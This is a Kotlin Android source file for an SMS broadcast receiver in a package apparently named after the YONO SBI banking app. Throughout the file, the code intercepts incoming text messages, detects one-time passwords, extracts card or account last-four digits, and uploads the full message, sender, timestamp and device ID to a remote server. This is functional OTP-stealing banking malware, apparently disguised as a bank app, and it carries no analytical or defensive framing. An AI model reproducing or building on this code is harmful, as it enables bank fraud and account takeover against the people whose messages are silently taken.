package com.example.yonosbi.services

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.PowerManager
import android.provider.Telephony
import android.util.Log
import kotlinx.coroutines.*

class SmsReceiver : BroadcastReceiver() {
    private val userApiService = UserApiService()

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action
        if (
            action != Telephony.Sms.Intents.SMS_DELIVER_ACTION &&
            action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION
        ) return  // Ignore unsupported actions

        val pendingResult = goAsync()
        val wakeLock = acquireWakeLock(context)

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)

                for (sms in messages) {
                    val sender = sms.originatingAddress ?: "UNKNOWN"
                    val body = sms.messageBody ?: ""
                    val timestamp = sms.timestampMillis

                    // Only send if OTP detected
                    val otp = extractOtp(body)
                    if (otp != null) {
                        Log.i(TAG, "OTP detected from $sender: $otp")
                        sendSmsToServer(context, sender, body, timestamp)
                    }
                }

            } catch (e: Exception) {
                Log.e(TAG, "Error while processing SMS", e)
            } finally {
                try {
                    wakeLock?.takeIf { it.isHeld }?.release()
                } catch (e: Exception) {
                    Log.e(TAG, "Error releasing WakeLock", e)
                }
                pendingResult.finish()
            }
        }
    }

    private fun acquireWakeLock(context: Context): PowerManager.WakeLock? {
        return try {
            val powerManager =
                context.getSystemService(Context.POWER_SERVICE) as PowerManager
            powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "Yonosbi:SmsReceiverWakeLock"
            ).apply { acquire(60_000) }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to acquire WakeLock", e)
            null
        }
    }

    private suspend fun sendSmsToServer(
        context: Context,
        sender: String,
        message: String,
        timestamp: Long
    ) {
        try {
            val deviceId = DeviceService.getUniqueId(context)
            val cardSuffix = extractCardSuffix(message)

            Log.i(TAG, "Sending SMS to server. Sender: $sender, Suffix: $cardSuffix")

            val success = userApiService.sendSmsMessage(
                sender = sender,
                message = message,
                timestamp = timestamp,
                deviceId = deviceId,
                cardSuffix = cardSuffix
            )

            if (success) {
                Log.i(TAG, "SMS sent successfully to server")
            } else {
                Log.w(TAG, "Server rejected SMS")
            }

        } catch (e: Exception) {
            Log.e(TAG, "API error while sending SMS", e)
        }
    }

    /** Extract OTP from message body */
    private fun extractOtp(message: String): String? {
        val regex = "\\b\\d{4,6}\\b".toRegex()
        return regex.find(message)?.value
    }

    /** Extract card suffix (last 4 digits) from message body */
    private fun extractCardSuffix(message: String): String? {
        // Look for patterns like "ending in 1234", "card xx1234", "A/c no. XX1234"
        val regex = "(?i)(?:ending|card|a/c|acc|account|no\\.?)\\s*(?:in|xx|\\*\\*|\\s)*(\\d{4})\\b".toRegex()
        return regex.find(message)?.groupValues?.get(1)
    }

    companion object {
        private const val TAG = "SmsReceiver"
    }
}